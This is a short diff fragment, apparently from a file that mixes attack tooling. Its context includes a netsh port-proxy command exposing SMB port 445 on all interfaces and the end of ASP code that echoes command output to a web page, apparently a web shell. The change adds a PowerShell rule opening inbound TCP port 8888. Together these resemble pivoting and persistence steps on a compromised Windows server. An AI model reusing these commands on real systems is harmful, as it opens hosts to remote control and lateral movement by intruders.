@@ -61,3 +61,7 @@ netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connec
         Response.Write "<pre>" & Server.HTMLEncode(result) & "</pre>"
     End If
 %>
+
+
+
+New-NetFirewallRule -DisplayName "Allow Port 8888" -Direction Inbound -LocalPort 8888 -Protocol TCP -Action Allow
